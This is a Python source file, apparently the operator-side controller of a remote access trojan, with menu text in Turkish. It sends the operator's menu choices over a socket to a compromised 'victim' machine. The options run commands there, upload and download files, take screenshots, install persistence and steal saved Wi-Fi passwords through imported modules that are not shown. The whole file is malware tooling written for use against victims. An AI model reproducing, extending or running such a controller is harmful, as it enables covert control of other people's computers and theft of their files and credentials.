from core.command import run_command
from core.fileupload import upload_files
from core.file_folder_download import receive_file_folder
from core.screenshot import capture_screenshot
from core.persistent import become_persistent
from core.wifi import steal_wifi_pass

# had a error when used from core.*** to import stuff but gone when removed it


def show_options():
    print("\n")
    print("\t \t [ 01 ] Victim makinesinde komut calistir")
    print("\t \t [ 02 ] Victim makinesine dosya yukle")
    print("\t \t [ 03 ] Dosya veya Klasor inidr")
    print("\t \t [ 04 ] Klasor degistir")
    print("\t \t [ 05 ] Screenshot Al")
    print("\t \t [ 06 ] Persistent ol")
    print("\t \t [ 07 ] Wifi sifresini al")
    print("\t \t [ 99 ] Exit!")
    print("\n")


def handleConnection(my_socket):
    print("[+] handling Connection")

    while True:
        show_options()
        user_input = input("[+] Secim yapiniz: ")

        # kullanıcı girdisini istemciye göndermek
        my_socket.send_data(user_input)

        if user_input == "1":
            print("[+] Client makinesinde komut calistiriyor")
            # command execution icin fonksiyon olusturuldu
            run_command(my_socket)

        elif user_input == "2":
            # upload files
            print("[+] Dosya Yukle")
            upload_files(my_socket)

        elif user_input == "3":
            receive_file_folder(my_socket)

        elif user_input == "4":
            my_socket.change_dir()

        elif user_input == "5":
            capture_screenshot(my_socket)

        elif user_input == "6":
            become_persistent(my_socket)

        elif user_input == "7":
            steal_wifi_pass(my_socket)

        elif user_input == "99":
            print("[+] Cikis....")

            break

        else:
            print("[+] Hatali giris")
